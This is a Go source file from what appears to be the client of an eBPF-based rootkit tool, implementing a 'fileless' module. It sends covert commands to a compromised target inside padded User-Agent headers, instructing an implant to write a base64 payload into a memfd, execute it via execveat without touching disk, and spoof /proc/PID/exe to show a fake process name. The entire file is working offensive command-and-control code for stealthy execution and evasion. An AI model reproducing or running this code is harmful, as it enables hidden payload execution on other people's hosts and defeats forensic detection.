package fileless

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type FilelessResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, payload, fakeName, output string) error {
	result := &FilelessResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_memfd_create",
			"kprobe on memfd_create to assist anonymous file descriptor creation",
			"fileless_hook_memfd",
		},
		{
			"write_payload_to_memfd",
			"write base64-decoded payload into anonymous memory-backed file descriptor",
			"fileless_write_payload",
		},
		{
			"hook_execveat",
			"kprobe on execveat to execute payload from fd without filesystem artifact",
			"fileless_hook_execveat",
		},
		{
			"execute_from_fd",
			"trigger execveat(fd, \"\", argv, envp, AT_EMPTY_PATH) for fileless execution",
			"fileless_exec_fd",
		},
		{
			"spoof_proc_exe",
			"modify /proc/PID/exe symlink readout to show fake process name",
			"fileless_spoof_exe",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + payload + "#" + fakeName
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/fileless_exec", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
